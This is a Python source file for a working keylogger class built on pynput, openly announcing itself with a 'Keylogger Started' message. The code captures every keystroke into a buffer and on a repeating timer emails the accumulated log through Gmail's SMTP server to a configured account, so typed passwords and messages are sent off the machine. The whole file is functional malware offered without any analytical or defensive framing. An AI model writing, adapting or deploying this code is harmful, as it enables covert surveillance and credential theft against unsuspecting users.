import pynput.keyboard
import threading
import smtplib
  

class Invoker:
    def __init__(self,interval,email,password):
        self.stored=""
        self.time = interval
        self.email = email
        self.password = password
        print("Keylogger Started")


    #This is used to concatenate the log 
    def concatenate_the_stored(self,string):
        self.stored = self.stored + string


    #Email server setup for send the logs     
    def send_mail(self,username,password,content):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(username,password)
        server.sendmail(username,username,content)
        server.quit()


    #This will basically log any key strike on the keyboard onto the global stored variable
    def key_strike(self,value):
        try:
            local = str(value.char)
        #Using try except if the user strikes the space key then it can simply be recorded as " " rather than key.space
        except AttributeError:
            if value == value.space:
                local = " "
            else:
                local = " " + str(value) + " "
        self.concatenate_the_stored(local)


    #Logging and reporting the data to the respective mail given
    def report_log(self):
        self.send_mail(self.email,self.password,"\n\n" + self.stored)
        self.stored = ""
        timer = threading.Timer(self.time,self.report_log)
        timer.start()


    #Just a beginning stuff to carry on with the keyboard_listener
    def begin(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_strike)
        with keyboard_listener:
            self.report_log()
            keyboard_listener.join()
        